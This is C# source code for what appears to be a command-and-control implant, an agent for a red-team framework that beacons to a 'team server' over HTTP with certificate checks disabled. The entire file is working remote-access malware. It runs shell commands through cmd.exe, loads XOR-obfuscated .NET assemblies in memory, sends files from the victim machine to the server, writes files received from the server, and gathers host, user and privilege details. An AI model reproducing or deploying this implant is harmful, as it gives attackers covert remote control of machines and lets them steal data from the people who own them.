using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Text.Json;
using System.Threading;

namespace Dots
{
    internal class Program
    {
        private static HttpClient client = new HttpClient();
        private static string key = "";
        private static string check_in_job_id = "";

        public static string Drives()
        {
            string result = "";
            foreach (DriveInfo objDrive in DriveInfo.GetDrives())
            {
                result += @"Drive Name : " + objDrive.Name + "\n" +
                          "Drive Type : " + objDrive.DriveType.ToString() + "\n" +
                          "Available Free Space : " + Math.Round(objDrive.AvailableFreeSpace / 1000000.0, 3) + " MB" + "\n" +
                          "Drive Format : " + objDrive.DriveFormat + "\n" +
                          "Total Free Space : " + Math.Round(objDrive.TotalFreeSpace / 1000000.0, 3) + " MB" + "\n" +
                          "Total Size : " + Math.Round(objDrive.TotalSize / 1000000.0, 3) + " MB" + "\n" +
                          "Volume Label : " + objDrive.VolumeLabel + "\n" +
                          "------------------------------------------------------------\n";
            }
            return result;
        }
        private static (int, string) ExecuteAssembely(byte[] assembly_bytes, string[] arguments, string method_name = "Main")
        {
            Assembly assembly;
            try
            {
                assembly = Assembly.Load(assembly_bytes);
            }
            catch (Exception ex)
            {
                return (-32600, Base64Encode(ex.ToString()));
            }

            try
            {
                Type[] types = assembly.GetExportedTypes();
                object methodOutput;
                foreach (Type type in types)
                {
                    foreach (MethodInfo method in type.GetMethods())
                    {
                        if (method.Name == method_name)
                        {
                            //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
                            TextWriter prevConOut = Console.Out;
                            var sw = new StringWriter();
                            Console.SetOut(sw);

                            object instance = Activator.CreateInstance(type);
                            methodOutput = method.Invoke(instance, new object[] { arguments });

                            //Restore output -- Stops redirecting output
                            Console.SetOut(prevConOut);
                            string strOutput = sw.ToString();

                            // Try catch this just in case the assembly we invoke doesn't have an (int) return value
                            // otherwise the program would explode
                            try
                            {
                                methodOutput = (int)methodOutput;
                            }
                            catch
                            {
                                methodOutput = 0;
                            }
                            return ((int)methodOutput, strOutput);
                        }
                    }
                }
                return (-32601, $"Could not find the method Main in the assembly.");
            }
            catch (Exception ex)
            {
                return (-32600, ex.ToString());
            }

        }
        public static string ExecuteCmd(string command)
        {
            var results = "";

            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {command}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = Process.Start(startInfo);

            using (process.StandardOutput)
            {
                results += process.StandardOutput.ReadToEnd();
            }

            using (process.StandardError)
            {
                results += process.StandardError.ReadToEnd();
            }

            return results;
        }

        //private static string[] endpoints = { "ASP", "N", "TESTING", "EFFORTS", "THE", "ASP", "TEAM"};
        private static string Post(string data, string uri)
        {
            // Console.WriteLine($"{uri}\n{data}\n-------------------------------");
            HttpResponseMessage postResults = client.PostAsync(uri, new StringContent(data)).Result;
            // Console.WriteLine($"{postResults.Content.ReadAsStringAsync().Result}\n--------------------------");
            return postResults.Content.ReadAsStringAsync().Result;
        }

        private static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        private static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        private static byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }

        public static string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
        {
            int length = endIndex - startIndex + 1;
            string[] outputArray = new string[length];
            Array.Copy(inputArray, startIndex, outputArray, 0, length);
            return outputArray;
        }

        public static string Integrity()
        {
            string result = "";
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                result = "*";
            }
            else
            {
                result = "";
            }
            return result;
        }
        private static void Run(string uri)
        {
            string batch_response = "";
            string endpoint = "";
            string team_server = uri;
            task[] batch_request;
            while (true)
            {
                int delay = new Random().Next(5000, 10000);
                if (check_in_job_id == "")
                {
                    endpoint = key;
                }
                else
                {
                    endpoint = "ASP";
                }
                try
                {
                    uri = team_server + endpoint;
                    batch_request = JsonSerializer.Deserialize<task[]>(Post(batch_response, uri));
                }
                catch (Exception ex)
                {
                    Thread.Sleep(delay);
                    batch_response = "[{\"jsonrpc\": \"2.0\", \"error\": {\"code\":-32700,\"message\":\"" + Base64Encode(ex.ToString()) + "\"},\"id\":\"" + check_in_job_id + "\"}]";
                    //Console.WriteLine($"{delay}\n--------------------------");
                    //Console.WriteLine($"{ex.Message}\n--------------------------");
                    continue;
                }
                try
                {
                    batch_response = "[";
                    foreach (var task in batch_request)
                    {
                        string name = task.name;
                        string[] batch_result = { };
                        string result = "";
                        byte[] byte_result = new byte[] { }; 
                        string task_id = task.id;
                        for (var i = 0; i < task.parameters.Count(); i++)
                        {
                            task.parameters[i] = Base64Decode(task.parameters[i].ToString());
                        }
                        try
                        {
                            if (name == "check_in")
                            {
                                check_in_job_id = task_id;
                                break;
                            }
                            if (name == "download")
                            {
                                string download_path = task.parameters[0];
                                byte[] filecontent = File.ReadAllBytes(download_path);
                                byte_result = filecontent;
                            }
                            if (name == "drives")
                            {
                                result = Drives();
                            }
                            if (name == "execute_assembly")
                            {
                                var task_error = 0;
                                var base64_encoded_assembly = task.parameters[0];
                                var key = task.parameters[1];
                                byte[] asmb_bytes = Zor(Convert.FromBase64String(base64_encoded_assembly), key);
                                Assembly assembly = Assembly.Load(asmb_bytes);

                                (task_error, result) = ExecuteAssembely(asmb_bytes, SliceArray(task.parameters, 2, task.parameters.Length - 1));
                            }
                            if (name == "hostname")
                            {
                                batch_result = new string[] { Environment.MachineName, Environment.MachineName };
                            }
                            if (name == "ip")
                            {
                                var host = Dns.GetHostEntry(Dns.GetHostName());
                                var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);
                                batch_result = new string[] { ip != null ? ip.ToString() : "0.0.0.0", ip != null ? ip.ToString() : "0.0.0.0" };
                            }
                            if (name == "kill")
                            {
                                Environment.Exit(0);
                            }
                            if (name == "os")
                            {
                                batch_result = new string[] { Environment.OSVersion.VersionString, Environment.OSVersion.VersionString };
                            }
                            if (name == "pid")
                            {
                                result = Process.GetCurrentProcess().Id.ToString();
                            }
                            if (name == "pwd")
                            {
                                result = Directory.GetCurrentDirectory();
                            }
                            if (name == "shell")
                            {
                                result = ExecuteCmd(string.Join(" ", task.parameters));
                            }
                            if (name == "upload")
                            {
                                byte[] data = Zor(Convert.FromBase64String(task.parameters[0]), task.parameters[1]);
                                string upload_path = task.parameters[2];
                                File.WriteAllBytes(upload_path, data);
                                result = "Wrote " + data.Length.ToString() + " bytes to: " + upload_path;
                            }
                            if (name == "whoami")
                            {
                                batch_result = new string[] { Integrity() + WindowsIdentity.GetCurrent().Name, Integrity() + WindowsIdentity.GetCurrent().Name };
                            }
                            if (batch_result.Length > 1)
                            {
                                for (int i = 0; i < batch_result.Length; i++)
                                {
                                    batch_result[i] = Base64Encode(batch_result[i]);
                                }
                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":[\"" + string.Join("\",\"", batch_result) + "\"],\"id\":\"" + task_id + "\"},";
                            }
                            if (result.Length > 1)
                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"" + Base64Encode(result) + "\",\"id\":\"" + task_id + "\"},";
                            if (byte_result.Length > 1)
                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"" + Convert.ToBase64String(byte_result) + "\",\"id\":\"" + task_id + "\"},";
                        }
                        catch (Exception ex)
                        {
                            batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"error\": {\"code\":-32600,\"message\":\"" + Base64Encode($"{ex.ToString()}") + "\"},\"id\":\"" + task_id + "\"},";
                        }
                    }
                }
                catch (Exception ex)
                {
                    batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"error\": {\"code\":-32700,\"message\":\"" + Base64Encode(ex.ToString()) + "\"},\"id\":\"" + check_in_job_id + "\"}]";
                    Thread.Sleep(delay);
                    continue;
                }
                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"checking in\",\"id\":\"" + check_in_job_id + "\"}]";
                Thread.Sleep(delay);
            }
        }
        static void Main(string[] args)
        {
            System.Net.ServicePointManager.ServerCertificateValidationCallback = (s, ce, ca, p) => true;
            key = args[1];
            Run(args[0]);
        }
        public class task
        {
            public string connectrpc { get; set; }
            public string id { get; set; }
            public string name { get; set; }
            public string[] parameters { get; set; }

        }
    }
}
